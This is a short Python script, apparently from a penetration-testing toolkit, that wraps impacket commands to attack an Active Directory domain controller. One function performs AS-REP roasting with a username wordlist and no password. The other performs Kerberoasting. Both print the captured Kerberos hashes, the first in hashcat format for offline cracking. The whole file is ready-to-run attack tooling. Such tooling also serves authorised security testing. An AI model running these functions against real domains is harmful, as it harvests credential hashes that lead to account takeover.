import subprocess

def unauthenticated_asrep(target, domain, wordlist):

    cmd = [
        "impacket-GetNPUsers",
        f"{domain.upper()}/",
        "-dc-ip", target,
        "-usersfile", wordlist,
        "-format", "hashcat",
        "-no-pass"
    ]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    output = ""

    for line in process.stdout:
        print(line, end="")
        output += line

    return output

def unauthenticated_kerberoast(target, domain):

    cmd = [
        "impacket-GetUserSPNs",
        "-request",
        "-dc-ip", target,
        f"{domain.upper()}/"
    ]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    output = ""

    for line in process.stdout:
        print(line, end="")
        output += line

    return output
